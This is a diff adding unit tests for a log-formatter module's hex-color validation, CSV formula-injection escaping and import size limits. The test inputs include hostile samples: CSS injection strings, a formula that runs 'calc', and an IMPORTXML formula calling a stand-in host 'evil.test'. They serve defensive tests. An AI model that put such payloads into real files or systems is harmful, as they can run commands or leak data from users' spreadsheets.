@@ -1,12 +1,18 @@
 import test from 'node:test';
 import assert from 'node:assert/strict';
 import {
+  MAX_IMPORT_BYTES,
+  MAX_IMPORT_RECORDS,
+  MAX_LOG_MESSAGE_LENGTH,
+  MAX_TAGS_PER_LOG,
   computeLogStats,
   filterAndSortLogs,
+  isValidHexColor,
   normalizeTagName,
   parseImportCSV,
   parseImportJSON,
   parseTagInput,
+  safeHexColor,
   serializeLogsToCSV,
   serializeLogsToJSON,
 } from './logFormatters';
@@ -118,4 +124,57 @@ test('computeLogStats calculates category, tag, and pinned totals accurately', (
   assert.equal(stats.by_tag[0].tag_name, 'prod');
   assert.equal(stats.by_tag[0].count, 2);
   assert.equal(stats.by_day.length, 30);
+});
+
+test('isValidHexColor and safeHexColor reject unsafe CSS values', () => {
+  assert.equal(isValidHexColor('#3b82f6'), true);
+  assert.equal(isValidHexColor(' #ABCDEF '), true);
+  assert.equal(isValidHexColor('#fff'), false);
+  assert.equal(isValidHexColor('red; background: url(https://evil.test)'), false);
+  assert.equal(safeHexColor('expression(alert(1))'), '#64748b');
+  assert.equal(safeHexColor(' #10b981 '), '#10b981');
+});
+
+test('serializeLogsToCSV neutralizes spreadsheet formula injection including leading whitespace', () => {
+  const dangerousLogs: LogEntry[] = [
+    {
+      ...sampleLogs[0],
+      id: 'log-formula-1',
+      message: '=CMD("calc")',
+      category_name: ' +SUM(A1:A2)',
+    },
+    {
+      ...sampleLogs[0],
+      id: 'log-formula-2',
+      message: '\t@IMPORTXML("https://evil.test")',
+      category_name: '-1+1',
+    },
+  ];
+  const csv = serializeLogsToCSV(dangerousLogs);
+  assert.match(csv, /"'=CMD\(""calc""\)"/);
+  assert.match(csv, /' \+SUM\(A1:A2\)/);
+  assert.match(csv, /'\t@IMPORTXML/);
+  assert.match(csv, /'-1\+1/);
+});
+
+test('parseImportJSON and parseImportCSV enforce size, record count, message length, and tag caps', () => {
+  const oversized = 'a'.repeat(MAX_IMPORT_BYTES + 10);
+  assert.match(parseImportJSON(oversized).errors[0], /1 MB limit/);
+  assert.match(parseImportCSV(oversized).errors[0], /1 MB limit/);
+
+  const tooManyRecords = Array.from({ length: MAX_IMPORT_RECORDS + 1 }, (_, i) => ({ message: `row ${i}` }));
+  assert.match(parseImportJSON(JSON.stringify(tooManyRecords)).errors[0], /limited to 500/);
+
+  const manyTags = Array.from({ length: MAX_TAGS_PER_LOG + 10 }, (_, i) => `tag${i}`);
+  const longMsg = 'x'.repeat(MAX_LOG_MESSAGE_LENGTH + 1);
+  const res = parseImportJSON(
+    JSON.stringify([
+      { message: longMsg },
+      { message: 'valid row', tags: manyTags },
+    ])
+  );
+  assert.equal(res.records.length, 1);
+  assert.equal(res.records[0].tags.length, MAX_TAGS_PER_LOG);
+  assert.equal(res.errors.length, 1);
+  assert.match(res.errors[0], /exceeds 10,000 characters/);
 });
